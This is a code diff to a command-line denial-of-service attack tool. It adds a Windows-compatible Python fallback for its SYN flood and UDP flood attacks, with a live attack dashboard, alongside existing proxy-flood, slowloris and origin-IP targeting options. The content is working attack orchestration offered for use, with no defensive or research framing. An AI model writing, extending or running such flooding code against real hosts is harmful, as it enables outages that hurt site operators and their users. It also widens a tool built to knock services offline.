@@ -15,8 +15,10 @@ from datetime import datetime
 from typing import Optional, Dict, List, Any
 from urllib.parse import urlparse
 
+IS_WINDOWS = sys.platform == "win32"
+
 # Set UTF-8 encoding for Windows console
-if sys.platform == 'win32':
+if IS_WINDOWS:
     import codecs
     sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'strict')
     sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, 'strict')
@@ -2087,6 +2089,34 @@ async def run_proxy_flood(target: str, cfg: dict):
     health_task.cancel()
     print_attack_summary(target, duration, result)
 
+async def _run_python_flood(target: str, duration: int, threads: int, method_name: str, vec: dict) -> Dict:
+    from core.attack.engines.layer4_v5 import TcpConnectionFlood, UdpFloodV5, MultiVectorFlood
+    if method_name == "syn":
+        engine = TcpConnectionFlood()
+    elif method_name == "udp":
+        engine = UdpFloodV5()
+    elif method_name == "mixed":
+        engine = MultiVectorFlood()
+    else:
+        engine = TcpConnectionFlood()
+    vec["status"] = "running"
+    task = asyncio.create_task(engine.attack(target, duration=duration, threads=threads))
+    while not task.done():
+        await asyncio.sleep(0.5)
+        sent = getattr(engine, "sent", 0) or 0
+        failed = getattr(engine, "failed", 0) or 0
+        vec["stats"]["total_requests"] = sent + failed
+        vec["stats"]["completed"] = sent
+        vec["stats"]["failed"] = failed
+    result = await task
+    sent = result.get("sent", 0) or 0
+    failed = result.get("failed", 0) or 0
+    vec["stats"]["total_requests"] = sent + failed
+    vec["stats"]["completed"] = sent
+    vec["stats"]["failed"] = failed
+    vec["status"] = "done"
+    return {"total_requests": sent + failed, "completed": sent, "failed": failed, "timeout": 0, "elapsed": duration}
+
 async def run_syn_flood(target: str, cfg: dict):
     """SYN Flood with LIVE DASHBOARD"""
     duration = int(get_input(" Duration (seconds, default 30): ") or "30")
@@ -2109,12 +2139,15 @@ async def run_syn_flood(target: str, cfg: dict):
         print(f" {c('g','[+]')} Origin IP: {opts['origin_ip']}")
     _rich_sep()
 
-    # Create single vector with live dashboard
+    # Use Python fallback on Windows, Go engine on Linux
+    use_python = IS_WINDOWS or not os.path.exists(GO_ENGINE)
+    if use_python:
+        print(f" {c('c','[*]')} Using Python TCP Connection Flood (Windows compat)")
+
     vectors = []
-    vec = {"label": "SYN Flood", "type": "go", "status": "pending", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
+    vec = {"label": "SYN Flood", "type": "py" if use_python else "go", "status": "pending", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
     vectors.append(vec)
     
-    # Start live dashboard
     from core.monitor.live_dashboard import LiveAttackDashboard
     dashboard = LiveAttackDashboard(
         target=target, vectors=vectors, proxy_pool=None,
@@ -2124,11 +2157,14 @@ async def run_syn_flood(target: str, cfg: dict):
     dashboard.start()
     
     try:
-        result = await run_go_engine(
-            target=target, duration=duration, rps=rps,
-            method="syn-flood", threads=threads, origin_ip=opts["origin_ip"],
-            live_stats=vec
-        )
+        if use_python:
+            result = await _run_python_flood(target, duration, threads, "syn", vec)
+        else:
+            result = await run_go_engine(
+                target=target, duration=duration, rps=rps,
+                method="syn-flood", threads=threads, origin_ip=opts["origin_ip"],
+                live_stats=vec
+            )
     except KeyboardInterrupt:
         result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
         vec["status"] = "error"
@@ -2160,12 +2196,14 @@ async def run_udp_flood(target: str, cfg: dict):
         print(f" {c('g','[+]')} Origin IP: {opts['origin_ip']}")
     _rich_sep()
 
-    # Create single vector with live dashboard
+    use_python = IS_WINDOWS or not os.path.exists(GO_ENGINE)
+    if use_python:
+        print(f" {c('c','[*]')} Using Python UDP Flood (Windows compat)")
+
     vectors = []
-    vec = {"label": "UDP Flood", "type": "go", "status": "pending", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
+    vec = {"label": "UDP Flood", "type": "py" if use_python else "go", "status": "pending", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
     vectors.append(vec)
     
-    # Start live dashboard
     from core.monitor.live_dashboard import LiveAttackDashboard
     dashboard = LiveAttackDashboard(
         target=target, vectors=vectors, proxy_pool=None,
@@ -2175,11 +2213,14 @@ async def run_udp_flood(target: str, cfg: dict):
     dashboard.start()
     
     try:
-        result = await run_go_engine(
-            target=target, duration=duration, rps=rps,
-            method="udp-flood", threads=threads, origin_ip=opts["origin_ip"],
-            live_stats=vec
-        )
+        if use_python:
+            result = await _run_python_flood(target, duration, threads, "udp", vec)
+        else:
+            result = await run_go_engine(
+                target=target, duration=duration, rps=rps,
+                method="udp-flood", threads=threads, origin_ip=opts["origin_ip"],
+                live_stats=vec
+            )
     except KeyboardInterrupt:
         result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
         vec["status"] = "error"
@@ -4087,13 +4128,21 @@ async def cmd_start(args, cfg):
             url=target, duration=duration, method="slowloris", rps=rps
         )
     elif method == "syn-flood":
-        result = await run_go_engine(
-            target=target, duration=duration, rps=rps, method="syn-flood"
-        )
+        if IS_WINDOWS:
+            from core.attack.engines.layer4_v5 import TcpConnectionFlood
+            engine = TcpConnectionFlood()
+            r = await engine.attack(target, duration=duration, threads=100)
+            result = {"total_requests": r.get("sent",0), "completed": r.get("sent",0), "failed": r.get("failed",0), "timeout": 0, "elapsed": duration}
+        else:
+            result = await run_go_engine(target=target, duration=duration, rps=rps, method="syn-flood")
     elif method == "udp-flood":
-        result = await run_go_engine(
-            target=target, duration=duration, rps=rps, method="udp-flood"
-        )
+        if IS_WINDOWS:
+            from core.attack.engines.layer4_v5 import UdpFloodV5
+            engine = UdpFloodV5()
+            r = await engine.attack(target, duration=duration, threads=100)
+            result = {"total_requests": r.get("sent",0), "completed": r.get("sent",0), "failed": 0, "timeout": 0, "elapsed": duration}
+        else:
+            result = await run_go_engine(target=target, duration=duration, rps=rps, method="udp-flood")
     elif method == "proxy-flood":
         from core.network.proxy import ProxyPool
         from core.attack.engines.enhanced import run_enhanced_attack
